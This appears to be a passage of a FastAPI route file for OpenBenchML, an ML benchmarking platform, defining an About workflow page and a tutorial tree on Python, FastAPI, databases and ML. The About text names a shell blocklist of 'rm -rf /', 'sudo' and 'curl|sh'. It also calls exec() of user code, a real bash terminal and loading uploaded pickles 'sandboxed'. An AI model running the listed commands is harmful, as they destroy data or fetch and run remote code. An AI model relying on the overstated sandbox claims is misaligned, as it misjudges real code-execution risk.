"""
OpenBenchML — About + Learn routes
==================================

Two new pages:

  GET /about  — visualises the entire workflow of the platform:
    • Pickle upload → benchmark → leaderboard
    • Convert (paste code → auto-pickle)
    • Notebook (server kernel + Pyodide + terminal)
    • Real-time WebSocket fan-out
    • Database + auth flow

  GET /learn  — a massive hierarchical learning centre:
    • /learn                — landing page with all topic categories
    • /learn/<slug>         — single concept page (e.g. /learn/python-loops)
    • /learn/cat/<slug>     — category index (e.g. /learn/cat/python)

The content is generated from a single LEARN_TREE structure defined in
this file so the page is always in sync with the route definitions.
"""

from __future__ import annotations

from fastapi import APIRouter, Request, HTTPException
from fastapi.responses import HTMLResponse
from typing import Optional

from app.config import APP_NAME, APP_VERSION, templates
from app.routes.auth import get_current_user_from_cookie
from app.database.db import SessionLocal

router = APIRouter()


# ═══════════════════════════════════════════════════════════════════════════
#  ABOUT PAGE — workflow visualisation
# ═══════════════════════════════════════════════════════════════════════════

ABOUT_SECTIONS = [
    {
        "id": "overview",
        "icon": "sparkles",
        "title": "What is OpenBenchML?",
        "lead": "OpenBenchML is an open-source platform that turns Python ML code into benchmarked, ranked, shareable models — without you ever leaving the browser.",
        "paragraphs": [
            "At its core, the platform is a FastAPI application backed by a relational database (SQLite in dev, Supabase Postgres in prod) and a Jinja2 template layer that renders server-side HTML. On top of that engine sit four major surfaces: a model upload + benchmark pipeline, a paste-and-pickle Convert page, a Colab-style Notebook with a real bash terminal, and a real-time WebSocket layer that pushes leaderboard updates to every open browser.",
            "Every request flows through a middleware stack — GZip compression, CORS, request-timing, security headers — before reaching the route handler. Auth is cookie-based (JWT inside an httpOnly cookie), and most write endpoints are user-scoped: your models, your notebooks, your submissions. The codebase is intentionally readable: each route file in app/routes/ maps 1-to-1 to a page or API group.",
        ],
    },
    {
        "id": "stack",
        "icon": "layers",
        "title": "The technology stack",
        "lead": "Five layers, each doing one job well.",
        "items_list": [
            ("FastAPI + Uvicorn", "ASGI web framework. Routes are async, validated by Pydantic, and auto-documented at /docs. Uvicorn runs the event loop that handles both HTTP and WebSocket traffic on the same port."),
            ("SQLAlchemy + Pydantic", "SQLAlchemy ORM talks to the database (SQLite or Postgres). Pydantic v2 models validate every API request body and serialise every response. Migrations are auto-applied at startup via init_db()."),
            ("Jinja2 templates", "Server-side HTML rendering. base.html is the layout shell; every other template extends it and fills in title, extra_css, content, and extra_js blocks. No client framework — just plain JS + fetch()."),
            ("WebSocket manager", "A ConnectionManager class in app/main.py tracks active WS clients. Three endpoints — /ws/benchmark, /ws/leaderboard, /ws/notifications — broadcast JSON events to subscribed browsers in real time."),
            ("Sandboxed Python kernel", "app/routes/notebook.py runs user Python in a per-user namespace dict, with a 30-minute TTL and 50-session cap. Shell commands go through an allowlist + pattern blocklist. The Terminal tab spawns a real PTY subprocess over WebSocket."),
        ],
    },
    {
        "id": "flow-upload",
        "icon": "upload",
        "title": "Workflow A — Upload a pickled model",
        "lead": "The classic pipeline: train offline, upload, benchmark, rank.",
        "steps": [
            ("1. Train", "You train a scikit-learn / XGBoost / LightGBM / PyTorch model locally and pickle it with joblib.dump(model, 'model.pkl')."),
            ("2. Upload", "POST /models/upload streams the .pkl file to the server. The models.py route stores the file under uploads/, creates a Model row in the DB, and links it to your user account."),
            ("3. Benchmark", "Pick a dataset, click Benchmark. The benchmark.py route loads the pickle, loads the dataset, runs predict() / predict_proba() on a holdout split, and computes accuracy/F1/RMSE depending on task type."),
            ("4. Leaderboard", "The result row is inserted into leaderboard_entries. A broadcast is sent on /ws/leaderboard, and every browser currently viewing the leaderboard sees the new row appear without refreshing."),
            ("5. Compete", "Optionally submit the model to a competition. competition_detail.html shows your submission, ranks it against others, and lets you post discussion comments."),
        ],
    },
    {
        "id": "flow-convert",
        "icon": "wand",
        "title": "Workflow B — Paste code, get a pickled model",
        "lead": "Skip the local Python install entirely.",
        "steps": [
            ("1. Paste", "Open /convert and paste a Python snippet that trains a model. The page auto-detects the framework (sklearn / xgboost / lightgbm) by grepping your code for import statements."),
            ("2. Run server-side", "Click Train. The snippet runs in a fresh server-side namespace with scikit-learn, xgboost, etc. already installed. Matplotlib figures are captured and rendered inline."),
            ("3. Pickle", "On success, the trained model is joblib.dump()'d to a temp file and POSTed to /api/convert/upload-pickle, which creates a Model row exactly like the manual upload path."),
            ("4. Benchmark", "The model is now in your library — pick it on the Benchmark page and run it against any dataset."),
        ],
    },
    {
        "id": "flow-notebook",
        "icon": "book",
        "title": "Workflow C — Colab-style Notebook",
        "lead": "Persistent kernel + shell + real terminal, all in the browser.",
        "steps": [
            ("1. Open /notebook", "A _SessionState is created for your user — a Python namespace dict + threading.Lock + cell counter + installed-packages list. TTL is 30 minutes; cap is 50 sessions."),
            ("2. Write cells", "Each code cell is sent to POST /api/notebook/cell with the source. The handler runs exec(code, session.namespace) under the lock, captures stdout/stderr via redirect, and extracts any matplotlib figures as base64 PNGs."),
            ("3. Shell commands", "Prefix a line with ! (e.g. !pip install xgboost) and it's routed through _execute_shell_command — an allowlist (pip, python, ls, ...) + pattern blocklist (rm -rf /, sudo, curl|sh, ...). pip auto-injects --break-system-packages for PEP 668."),
            ("4. Magics", "%whos lists variables. %time wraps a statement with timeit. %reset clears the namespace. %pip routes through the same shell path."),
            ("5. Terminal tab", "Click the Terminal tab and xterm.js opens a WebSocket to /api/notebook/terminal. The server spawns a real PTY bash subprocess (cwd /tmp, 30-min idle timeout) and pipes bytes both ways. You get a full bash shell — vim, top, ipython, git, everything."),
        ],
    },
    {
        "id": "flow-realtime",
        "icon": "bolt",
        "title": "Workflow D — Real-time fan-out",
        "lead": "How a benchmark in Tokyo reaches your browser in Berlin in <100ms.",
        "steps": [
            ("1. Benchmark completes", "benchmark.py finishes scoring a model. It builds a JSON event {type: 'leaderboard_update', dataset_id, model_id, score}."),
            ("2. Broadcast", "ws_manager.broadcast(event) iterates over every active WebSocket connection and sends the JSON."),
            ("3. Browser receives", "competition_detail.html has an open /ws/leaderboard socket. Its onmessage handler matches the dataset_id, then fetches the fresh leaderboard HTML from the API."),
            ("4. DOM patch", "The new rows replace the old tbody.innerHTML. No full page reload — just the table body swaps."),
        ],
    },
    {
        "id": "auth",
        "icon": "shield",
        "title": "Authentication & security",
        "lead": "Cookie-based JWT, scoped sessions, sandboxed execution.",
        "items_list": [
            ("Cookie auth", "Login sets an httpOnly cookie containing a JWT. Every page load calls get_current_user_from_cookie(request, db) to inject the user into the template context. No localStorage tokens, no manual Authorization headers."),
            ("Per-user kernel", "Notebook sessions are keyed by user.id. You cannot see another user's variables, installed packages, or terminal shell."),
            ("Shell allowlist", "The notebook shell executor rejects any command not in {pip, python, python3, ls, pwd, whoami, date, echo, cat, head, tail, wc, grep, find, df, du, free, uname, env, which, tree}. Blocked patterns include rm -rf /, sudo, curl|sh."),
            ("Security headers", "Every response carries X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy, and HSTS in production."),
            ("Input validation", "Every API request body is a Pydantic model with explicit length limits and regex patterns. Notebook code is capped at 50,000 chars; package names at 100 chars."),
        ],
    },
]


@router.get("/about", response_class=HTMLResponse)
async def about_page(request: Request):
    """Render the About / How-it-works page."""
    db = SessionLocal()
    try:
        user = await get_current_user_from_cookie(request, db)
    finally:
        db.close()

    return templates.TemplateResponse("about.html", {
        "request": request,
        "user": user,
        "app_name": APP_NAME,
        "app_version": APP_VERSION,
        "sections": ABOUT_SECTIONS,
    })


# ═══════════════════════════════════════════════════════════════════════════
#  LEARN SITE — hierarchical concepts
# ═══════════════════════════════════════════════════════════════════════════

LEARN_TREE = [
    # ─── Python fundamentals ──────────────────────────────────────────────
    {
        "category": "Python",
        "slug": "python",
        "icon": "snake",
        "color": "#3fb950",
        "blurb": "The language the entire backend (and most of the frontend helpers) is written in. Start here if you're new.",
        "concepts": [
            {
                "slug": "python-variables",
                "title": "Variables & assignment",
                "summary": "Names bound to objects. Python uses dynamic typing — a name can point to an int, then later to a string.",
                "code": "x = 42          # int\nname = 'Ada'    # str\nx = 'now str'   # legal — x is rebound\nprint(type(x))  # <class 'str'>",
                "explanation": "In Python, assignment `x = 42` does two things: (1) creates an int object `42` in memory, (2) binds the name `x` to that object. Reassigning `x = 'now str'` doesn't mutate the int — it just rebinds the name to a new str object. This is why Python is called 'dynamically typed': the type lives on the object, not on the name. The notebook's per-user namespace dict is literally a Python dict of these name→object bindings.",
                "used_in": "Every notebook cell. The kernel state panel on /notebook shows your current name→type bindings.",
            },
            {
                "slug": "python-types",
                "title": "Built-in types",
                "summary": "int, float, str, bool, list, tuple, dict, set, None — the nine workhorses.",
                "code": "counts = [3, 1, 4, 1, 5]      # list — mutable\npoint  = (3.0, 4.0)            # tuple — immutable\nconfig = {'lr': 0.01, 'n': 100} # dict\nflags  = {'fit', 'predict'}    # set\nnothing = None                  # null sentinel",
                "explanation": "Python ships with nine built-in types that cover 95% of everyday code. Lists are ordered and mutable; tuples are ordered and immutable; dicts are key→value mappings (insertion-ordered since Python 3.7); sets are unordered unique collections. The benchmark pipeline uses lists for prediction arrays, dicts for metric configs, and tuples for fixed shapes like (n_samples, n_features).",
                "used_in": "app/routes/benchmark.py uses dicts for metric configs and lists for prediction arrays.",
            },
            {
                "slug": "python-loops",
                "title": "Loops — for, while, comprehensions",
                "summary": "Iterate over any iterable. List comprehensions are the Pythonic way to build lists.",
                "code": "# for loop\nfor i in range(3):\n    print(i)\n\n# while loop\nn = 10\nwhile n > 1:\n    n //= 2\n\n# comprehension (preferred)\nsquares = [x*x for x in range(10) if x % 2 == 0]",
                "explanation": "`for` iterates over any iterable (lists, tuples, dicts, strings, files, generators). `while` runs until a condition is false. The Pythonic idiom for building a list is a comprehension: `[expr for x in iter if cond]` — it's faster than a for+append loop because the list is built in C. OpenBenchML uses comprehensions everywhere — e.g. leaderboard serialisation: `[{**r.__dict__} for r in rows]`.",
                "used_in": "Every route that returns a list of models/datasets/competitions uses a comprehension to build the response.",
            },
            {
                "slug": "python-functions",
                "title": "Functions, *args, **kwargs",
                "summary": "Reusable blocks. *args collects positional args into a tuple; **kwargs collects keyword args into a dict.",
                "code": "def greet(name, greeting='Hello', **extras):\n    msg = f\"{greeting}, {name}!\"\n    if extras.get('shout'):\n        msg = msg.upper()\n    return msg\n\ngreet('Ada')                       # 'Hello, Ada!'\ngreet('Ada', greeting='Hi')        # 'Hi, Ada!'\ngreet('Ada', greeting='Hi', shout=True)  # 'HI, ADA!'",
                "explanation": "Functions are defined with `def` and return with `return` (None if no return statement). Default arguments are evaluated once at function-definition time — mutable defaults like `def f(x=[])` are a famous footgun. `*args` collects extra positional args into a tuple; `**kwargs` collects extra keyword args into a dict. FastAPI uses `**kwargs` heavily in route signatures — every query param, path param, and body becomes a kwarg.",
                "used_in": "Every route handler in app/routes/ is a function. FastAPI inspects the signature to decide what to inject.",
            },
            {
                "slug": "python-classes",
                "title": "Classes & __init__",
                "summary": "Blueprints for objects. __init__ runs when an instance is created; self is the instance.",
                "code": "class SessionState:\n    def __init__(self, user_id: int):\n        self.user_id = user_id\n        self.namespace = {}\n        self.cell_count = 0\n\n    def touch(self):\n        self.cell_count += 1\n\ns = SessionState(user_id=1)\ns.touch()",
                "explanation": "A class is a blueprint. `__init__` is the constructor — it runs every time you call `ClassName(...)`. `self` is the instance being constructed (like `this` in JS). Methods are just functions defined inside the class body; their first parameter is always the instance. The notebook's _SessionState class is a perfect example: each user gets one instance, and the per-user namespace dict lives on `self`.",
                "used_in": "app/routes/notebook.py — _SessionState is the per-user kernel state.",
            },
            {
                "slug": "python-decorators",
                "title": "Decorators",
                "summary": "A function that wraps another function. @router.get('/x') is a decorator that registers the function as a route handler.",
                "code": "@router.get('/health')\nasync def health():\n    return {'status': 'ok'}\n\n# equivalent to:\nasync def health():\n    return {'status': 'ok'}\nhealth = router.get('/health')(health)",
                "explanation": "A decorator is a function that takes a function and returns a (usually wrapped) function. The `@syntax` is sugar: `@dec def f(): ...` is `f = dec(f)`. FastAPI's `@router.get('/path')` is a decorator that registers the function as the handler for `GET /path`. The auth middleware uses a `@require_login` decorator on routes that need a logged-in user.",
                "used_in": "Every single route in app/routes/. Also `@app.middleware('http')` in main.py.",
            },
            {
                "slug": "python-async",
                "title": "async / await",
                "summary": "Coroutines that yield control to the event loop. FastAPI route handlers are async so they don't block other requests.",
                "code": "async def fetch_user(uid: int):\n    user = await db.fetch_one(...)  # non-blocking\n    return user\n\n# bad — blocks the event loop\n# def fetch_user(uid): time.sleep(5)",
                "explanation": "An async function (coroutine) returns immediately and resumes later when its awaited operation completes. While it's waiting (e.g. for a DB query), the event loop can run other coroutines — that's how a single Uvicorn worker can handle thousands of concurrent requests. The rule: if a function does I/O (DB, HTTP, file), make it async and await the I/O. CPU-bound work (like running a model benchmark) should be offloaded to a thread pool via `run_in_executor`.",
                "used_in": "Every FastAPI route. Notebook cell execution uses `run_in_executor` so the model fit doesn't block the event loop.",
            },
            {
                "slug": "python-exceptions",
                "title": "Exceptions & try/except",
                "summary": "Errors are raised, caught, and handled. Don't swallow exceptions silently.",
                "code": "try:\n    result = 10 / x\nexcept ZeroDivisionError as e:\n    print(f'cannot divide by zero: {e}')\n    result = None\nexcept Exception:\n    raise  # re-raise anything unexpected\nfinally:\n    cleanup()",
                "explanation": "Python uses exceptions for error handling. `try` runs code; `except` catches specific exception types; `finally` always runs. The notebook kernel wraps every cell in try/except so a syntax error in one cell doesn't kill the kernel — it just renders the traceback in the output pane and the next cell can still run. FastAPI's exception handlers in main.py catch 404/500/429 and return proper HTML or JSON.",
                "used_in": "Notebook cell executor, FastAPI exception handlers, model loading in benchmark.py.",
            },
            {
                "slug": "python-context-managers",
                "title": "Context managers (with)",
                "summary": "with x as y: guarantees cleanup (closing files, releasing locks) even if an exception is raised.",
                "code": "with open('data.csv') as f:\n    rows = f.read().splitlines()\n# f is closed here even if read() threw\n\nwith session.lock:\n    session.namespace['x'] = 42",
                "explanation": "A context manager implements `__enter__` and `__exit__`. The `with` statement calls `__enter__`, runs the block, and always calls `__exit__` — even on exception. This is the right way to acquire locks (the notebook session lock), open files, or hold DB transactions. The notebook uses `with session.lock:` to ensure only one cell runs at a time per user.",
                "used_in": "app/routes/notebook.py — `with session.lock:` guards the namespace dict.",
            },
            {
                "slug": "python-modules",
                "title": "Modules & imports",
                "summary": "Each .py file is a module. from app.routes import notebook pulls in that module's names.",
                "code": "# app/routes/notebook.py\ndef _get_or_create_session(uid): ...\n\n# app/main.py\nfrom app.routes import notebook as notebook_route\napp.include_router(notebook_route.router)",
                "explanation": "Python modules are just .py files. `import x` runs the file and binds the module name. `from x import y` runs the file and binds only `y`. Packages are directories with `__init__.py`. OpenBenchML uses absolute imports (`from app.routes import notebook`) — relative imports (`from . import notebook`) work too but are discouraged for top-level packages. The notebook route imports from app.config, app.database, app.routes.auth — a clear dependency tree.",
                "used_in": "app/main.py imports every route module and includes its router.",
            },
            {
                "slug": "python-generators",
                "title": "Generators (yield)",
                "summary": "Functions that produce a stream of values lazily. Memory-efficient for big data.",
                "code": "def fib():\n    a, b = 0, 1\n    while True:\n        yield a\n        a, b = b, a + b\n\ngen = fib()\nprint([next(gen) for _ in range(10)])  # [0,1,1,2,3,5,8,13,21,34]",
                "explanation": "A generator function uses `yield` instead of `return`. Each `yield` pauses the function and emits a value; calling `next()` resumes it. Generators are lazy — they only compute the next value when asked. This is how Python streams huge files line-by-line without loading them all into memory. FastAPI supports streaming responses via `StreamingResponse` which takes an async generator.",
                "used_in": "Used implicitly in dict comprehensions, range(), and file iteration throughout the codebase.",
            },
        ],
    },

    # ─── Web / FastAPI ────────────────────────────────────────────────────
    {
        "category": "Web & FastAPI",
        "slug": "web",
        "icon": "globe",
        "color": "#58a6ff",
        "blurb": "How HTTP requests become HTML pages and JSON responses.",
        "concepts": [
            {
                "slug": "fastapi-routes",
                "title": "Routes & path operations",
                "summary": "@router.get('/path') registers a function as the handler for GET requests to /path.",
                "code": "@router.get('/notebook')\nasync def notebook_page(request: Request):\n    user = await get_current_user_from_cookie(request, db)\n    return templates.TemplateResponse('notebook.html', {'user': user})",
                "explanation": "A route is a function that FastAPI calls when a matching HTTP request arrives. The decorator specifies the method (GET/POST/PUT/DELETE) and path. Path parameters like `/models/{id}` become function arguments. Query parameters like `?limit=10` are auto-parsed from the function signature. The function can be sync or async; FastAPI runs sync functions in a threadpool so they don't block the event loop.",
                "used_in": "Every page and API endpoint in the app. There are 50+ routes across 11 route files.",
            },
            {
                "slug": "fastapi-request",
                "title": "The Request object",
                "summary": "request.headers, request.cookies, request.url, request.query_params — everything the client sent.",
                "code": "@router.get('/x')\nasync def handler(request: Request):\n    user_agent = request.headers.get('user-agent')\n    token = request.cookies.get('access_token')\n    next_url = request.query_params.get('next', '/')",
                "explanation": "The Request object is FastAPI's representation of the incoming HTTP request. It exposes headers, cookies, query params, the URL, the client's IP, and the body (for POST/PUT). Most routes need it for cookie-based auth (reading the access_token cookie) or for building absolute URLs. You ask for it by adding `request: Request` to the function signature — FastAPI sees the type annotation and injects it.",
                "used_in": "Every auth-gated route reads request.cookies to get the JWT.",
            },
            {
                "slug": "fastapi-pydantic",
                "title": "Pydantic request bodies",
                "summary": "Define a Pydantic model; FastAPI validates the JSON body, raises 422 if invalid.",
                "code": "class NotebookCellRequest(BaseModel):\n    code: str = Field(..., min_length=1, max_length=50_000)\n    timeout_seconds: int = Field(default=120, ge=5, le=600)\n    cell_id: Optional[str] = None\n\n@router.post('/api/notebook/cell')\nasync def cell(req: NotebookCellRequest):\n    run_code(req.code, timeout_seconds=req.timeout_seconds)",
                "explanation": "Pydantic is a data-validation library. You declare a class with typed fields; Pydantic validates incoming JSON against the types and constraints (min_length, max_length, ge, le, regex). If validation fails, FastAPI returns a 422 with a detailed error message — you never write manual validation code. The notebook's cell endpoint uses this to cap code at 50k chars and timeout at 5–600s.",
                "used_in": "Every POST/PUT endpoint. Notebook, convert, auth, models, competitions all use Pydantic request models.",
            },
            {
                "slug": "fastapi-templates",
                "title": "Jinja2 templates",
                "summary": "Server-side HTML rendering with {% extends %}, {% block %}, {{ var }}.",
                "code": "# base.html\n<title>{% block title %}OpenBenchML{% endblock %}</title>\n\n# notebook.html\n{% extends 'base.html' %}\n{% block title %}Notebook — OpenBenchML{% endblock %}\n{% block content %}<h1>Notebook</h1>{% endblock %}",
                "explanation": "Jinja2 is a templating engine. Templates extend a base layout and override named blocks. Variables use `{{ var }}`; control flow uses `{% if %}`, `{% for %}`, `{% block %}`. The template is rendered server-side into a complete HTML string which is sent to the browser. This is faster and more SEO-friendly than client-side rendering (React/Vue) because the browser gets a complete page on the first byte.",
                "used_in": "Every HTML page. base.html is the shell; 21 other templates extend it.",
            },
            {
                "slug": "fastapi-middleware",
                "title": "Middleware",
                "summary": "Code that runs before/after every request. Used for timing, security headers, CORS.",
                "code": "@app.middleware('http')\nasync def timing(request: Request, call_next):\n    t0 = time.perf_counter()\n    response = await call_next(request)\n    response.headers['X-Process-Time'] = f'{(time.perf_counter()-t0)*1000:.1f}ms'\n    return response",
                "explanation": "Middleware is a wrapper around the entire app. Each request passes through the middleware stack before reaching the route, and each response passes through it again on the way back. OpenBenchML uses middleware for: GZip compression (smaller responses), CORS (allow cross-origin requests), request timing (X-Process-Time header), security headers (X-Frame-Options, HSTS), and structured logging. Order matters: the last-added middleware runs first.",
                "used_in": "app/main.py — three middleware decorators set up the full stack.",
            },
            {
                "slug": "fastapi-websockets",
                "title": "WebSockets",
                "summary": "Bidirectional, persistent connection. Used for live leaderboard updates.",
                "code": "@app.websocket('/ws/leaderboard')\nasync def ws_leaderboard(websocket: WebSocket):\n    await websocket.accept()\n    while True:\n        data = await websocket.receive_json()\n        if data.get('type') == 'ping':\n            await websocket.send_json({'type': 'pong'})",
                "explanation": "A WebSocket is a persistent bidirectional connection — unlike HTTP, where the client asks and the server answers, with WebSockets either side can send at any time. This is essential for real-time features: when a benchmark finishes, the server pushes the result to every connected browser instantly. The ConnectionManager class in main.py tracks active connections so the broadcast can fan out to all of them.",
                "used_in": "app/main.py — three WS endpoints (benchmark, leaderboard, notifications). app/routes/notebook.py — one WS for the terminal.",
            },
            {
                "slug": "fastapi-deps",
                "title": "Dependency injection (Depends)",
                "summary": "Share setup logic across routes. get_db is a dep that opens a DB session per request.",
                "code": "def get_db():\n    db = SessionLocal()\n    try:\n        yield db\n    finally:\n        db.close()\n\n@router.get('/x')\nasync def handler(db: Session = Depends(get_db)):\n    return db.query(Model).all()",
                "explanation": "FastAPI's dependency injection lets you factor out setup/teardown logic. `Depends(get_db)` runs `get_db()` before the route, injects the yielded value as `db`, and runs the cleanup (db.close()) after the route returns — even on exception. This gives you per-request DB sessions without manual try/finally in every handler. Dependencies can themselves depend on other dependencies — FastAPI builds a DAG and resolves it in order.",
                "used_in": "Every route that touches the database uses `db: Session = Depends(get_db)`.",
            },
            {
                "slug": "fastapi-lifespan",
                "title": "App lifespan (startup/shutdown)",
                "summary": "Run code when the app starts and stops. Used to init the DB and seed data.",
                "code": "@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    init_db()          # startup\n    seed_database()\n    yield              # app runs here\n    # cleanup on shutdown\n\napp = FastAPI(lifespan=lifespan)",
                "explanation": "The lifespan context manager wraps the app's entire run. Code before `yield` runs at startup; code after `yield` runs at shutdown. OpenBenchML uses it to create database tables (init_db) and seed default datasets on boot, and to close all WebSocket connections on shutdown. This replaced the older @app.on_event('startup') decorator and is the recommended pattern for FastAPI 0.93+.",
                "used_in": "app/main.py — lifespan creates tables, seeds data, cleans up WS on shutdown.",
            },
        ],
    },

    # ─── Databases & SQL ─────────────────────────────────────────────────
    {
        "category": "Databases & SQL",
        "slug": "database",
        "icon": "database",
        "color": "#bc8cff",
        "blurb": "How data survives between requests — tables, rows, sessions, migrations.",
        "concepts": [
            {
                "slug": "db-orm",
                "title": "SQLAlchemy ORM",
                "summary": "Map Python classes to DB tables. No raw SQL — just .query(Model).all().",
                "code": "class User(Base):\n    __tablename__ = 'users'\n    id = Column(Integer, primary_key=True)\n    username = Column(String, unique=True)\n\nusers = db.query(User).filter(User.id == 1).all()",
                "explanation": "An ORM (Object-Relational Mapper) lets you treat database rows as Python objects. You declare a class with Column-typed attributes; SQLAlchemy generates the CREATE TABLE statement and translates .query()/.filter()/.add() into SQL under the hood. The big win: you write Python, not SQL strings, so typos are caught at import time and refactors are safe. OpenBenchML has models for User, Model, Dataset, BenchmarkJob, LeaderboardEntry, Competition, Comment — all in app/database/models.py.",
                "used_in": "app/database/models.py defines all tables. Every route that reads/writes data uses the ORM.",
            },
            {
                "slug": "db-sessions",
                "title": "DB sessions",
                "summary": "A session is a unit of work — track changes, commit, rollback. One per request.",
                "code": "db = SessionLocal()\ntry:\n    user = User(username='ada')\n    db.add(user)\n    db.commit()         # writes to DB\n    db.refresh(user)    # loads the new id\nexcept:\n    db.rollback()       # undoes partial changes\nfinally:\n    db.close()",
                "explanation": "A DB session is a holding area for objects you're working with. When you `db.add(obj)`, the row isn't written yet — it's tracked in memory. `db.commit()` flushes all pending changes to the DB in a single transaction. If anything goes wrong, `db.rollback()` undoes everything since the last commit. The `get_db()` dependency wraps this in try/finally so every request gets a fresh session and the session is always closed, even on exception.",
                "used_in": "app/database/db.py — SessionLocal() is the session factory. get_db() yields one per request.",
            },
            {
                "slug": "db-relationships",
                "title": "Relationships & joins",
                "summary": "ForeignKey + relationship() lets you walk from a User to their Models with no SQL.",
                "code": "class User(Base):\n    models = relationship('Model', back_populates='user')\n\nclass Model(Base):\n    user_id = Column(Integer, ForeignKey('users.id'))\n    user = relationship('User', back_populates='models')\n\nuser = db.query(User).first()\nprint(user.models)  # [<Model 1>, <Model 2>, ...]",
                "explanation": "Foreign keys declare 'this column points to a row in another table'. relationship() tells SQLAlchemy how to walk the join — user.models runs a lazy SELECT the first time you access it. back_populates keeps both sides in sync: setting model.user = some_user automatically appends model to some_user.models. OpenBenchML uses this for User→Models, Dataset→BenchmarkJobs, Competition→Submissions, Comment→Replies.",
                "used_in": "app/database/models.py — every model has relationships to its parent/child tables.",
            },
            {
                "slug": "db-migrations",
                "title": "Schema & migrations",
                "summary": "init_db() runs CREATE TABLE IF NOT EXISTS on startup. For schema changes, use Alembic.",
                "code": "Base.metadata.create_all(engine)  # creates all tables\n\n# Alembic for migrations (not used in this app, but standard):\n# alembic revision --autogenerate -m 'add email col'\n# alembic upgrade head",
                "explanation": "Schema management has two levels. (1) `Base.metadata.create_all(engine)` creates every table that doesn't exist yet — perfect for fresh setups but it can't alter existing tables. (2) For production schema evolution, use Alembic: it generates migration scripts that ALTER tables in a controlled way. OpenBenchML uses the simple approach because the schema is stable; if you add a column, you'd drop the SQLite file in dev and let it recreate. In prod (Supabase Postgres) you'd run Alembic.",
                "used_in": "app/main.py lifespan calls init_db() → Base.metadata.create_all() at startup.",
            },
            {
                "slug": "db-indexes",
                "title": "Indexes",
                "summary": "Speed up WHERE clauses at the cost of slower writes. Add to columns you filter on.",
                "code": "class User(Base):\n    username = Column(String, unique=True, index=True)\n    email    = Column(String, index=True)\n\n# These are now fast:\ndb.query(User).filter(User.username == 'ada').first()\ndb.query(User).filter(User.email == 'a@b.com').first()",
                "explanation": "An index is a sorted copy of a column that lets the DB find rows without scanning the whole table. Without an index on `username`, a login query has to check every row — O(n). With an index, it's O(log n). The trade-off: every INSERT/UPDATE on an indexed column has to update the index too, so writes get slower. Rule of thumb: index columns you WHERE-filter on (foreign keys, usernames, emails) and don't index columns you only display.",
                "used_in": "app/database/models.py — username, email, slug columns are indexed.",
            },
        ],
    },

    # ─── Machine Learning ────────────────────────────────────────────────
    {
        "category": "Machine Learning",
        "slug": "ml",
        "icon": "brain",
        "color": "#eab308",
        "blurb": "The whole point of the platform — train, evaluate, rank models.",
        "concepts": [
            {
                "slug": "ml-supervised",
                "title": "Supervised learning",
                "summary": "Train on labelled (X, y) pairs to predict y for new X.",
                "code": "from sklearn.ensemble import RandomForestClassifier\n\nmodel = RandomForestClassifier(n_estimators=100)\nmodel.fit(X_train, y_train)        # learn\npreds = model.predict(X_test)      # predict\nacc  = (preds == y_test).mean()    # evaluate",
                "explanation": "Supervised learning is the bread-and-butter of ML: you have examples (X) with labels (y), and the model learns a function from X to y. Classification predicts a discrete label (spam/not-spam); regression predicts a continuous value (house price). OpenBenchML benchmarks supervised models by calling fit() then predict() on a holdout split, then computing accuracy/F1 (classification) or RMSE/MAE (regression).",
                "used_in": "app/routes/benchmark.py — every benchmark runs fit() + predict() and scores the result.",
            },
            {
                "slug": "ml-train-test-split",
                "title": "Train/test split",
                "summary": "Hold out part of the data to measure generalisation. Never evaluate on training data.",
                "code": "from sklearn.model_selection import train_test_split\n\nX_tr, X_te, y_tr, y_te = train_test_split(\n    X, y, test_size=0.2, random_state=42, stratify=y\n)\nmodel.fit(X_tr, y_tr)\nprint(model.score(X_te, y_te))  # honest evaluation",
                "explanation": "If you evaluate a model on the same data it was trained on, you get an over-optimistic score — the model just memorised the answers. The fix: split the data into a training set (e.g. 80%) and a test set (20%). Train on the training set; evaluate on the test set. The test-set score is an honest estimate of how the model will perform on new, unseen data. stratify=y keeps the class balance the same in both splits — important for imbalanced data.",
                "used_in": "app/routes/benchmark.py — every benchmark does a train/test split before fitting.",
            },
            {
                "slug": "ml-metrics",
                "title": "Evaluation metrics",
                "summary": "Accuracy, precision, recall, F1, RMSE, MAE — pick the metric that matches the goal.",
                "code": "from sklearn.metrics import (\n    accuracy_score, f1_score,\n    mean_squared_error, r2_score\n)\n\n# classification\nacc = accuracy_score(y_test, preds)\nf1  = f1_score(y_test, preds, average='weighted')\n\n# regression\nrmse = mean_squared_error(y_test, preds, squared=False)\nr2   = r2_score(y_test, preds)",
                "explanation": "Different metrics measure different things. Accuracy is intuitive but misleading on imbalanced data (90% accuracy is trivial if 90% of samples are class 0). F1 balances precision and recall. RMSE penalises large errors more than MAE. R² measures how much variance the model explains. OpenBenchML picks the metric based on task type — accuracy/F1 for classification, RMSE/R² for regression — and the leaderboard ranks by that metric.",
                "used_in": "app/routes/benchmark.py — picks the metric based on the dataset's task_type.",
            },
            {
                "slug": "ml-pickle",
                "title": "Pickle / joblib serialisation",
                "summary": "Save a trained model to a .pkl file. Load it later without retraining.",
                "code": "import joblib\n\n# save\njoblib.dump(model, 'rf_model.pkl')\n\n# load (could be in a different process / server)\nmodel = joblib.load('rf_model.pkl')\npreds = model.predict(X_new)",
                "explanation": "Training a model can take minutes or hours; predicting takes milliseconds. Pickle/joblib serialises the trained model object (including learned weights, hyperparameters, feature importances) into a binary file. You can then load that file in a different process and call predict() without retraining. OpenBenchML's whole upload flow is built on this: users train locally, dump to .pkl, upload the .pkl, and the server loads it for benchmarking. joblib is preferred over pickle for sklearn models because it handles numpy arrays more efficiently.",
                "used_in": "app/routes/models.py — upload endpoint receives .pkl. app/routes/benchmark.py — joblib.load() then predict().",
            },
            {
                "slug": "ml-frameworks",
                "title": "Framework auto-detection",
                "summary": "Sniffing the imports in pasted code to suggest the right pip install.",
                "code": "code = '''\nimport xgboost as xgb\nfrom sklearn.metrics import accuracy_score\n'''\n\n# auto-detect\nif 'xgboost' in code or 'import xgb' in code:\n    framework = 'xgboost'\nelif 'lightgbm' in code:\n    framework = 'lightgbm'\nelse:\n    framework = 'sklearn'",
                "explanation": "When a user pastes code into /convert, the page greps the code for import statements to guess the framework. This drives the UI hint ('Detected: XGBoost — installing xgboost…') and decides which packages to install before running the cell. The same trick powers the notebook's package recommendation engine: parse the imports, check which ones aren't installed, suggest the pip install commands.",
                "used_in": "templates/convert.html — JS auto-detects the framework from the pasted code.",
            },
        ],
    },

    # ─── Frontend ────────────────────────────────────────────────────────
    {
        "category": "Frontend",
        "slug": "frontend",
        "icon": "palette",
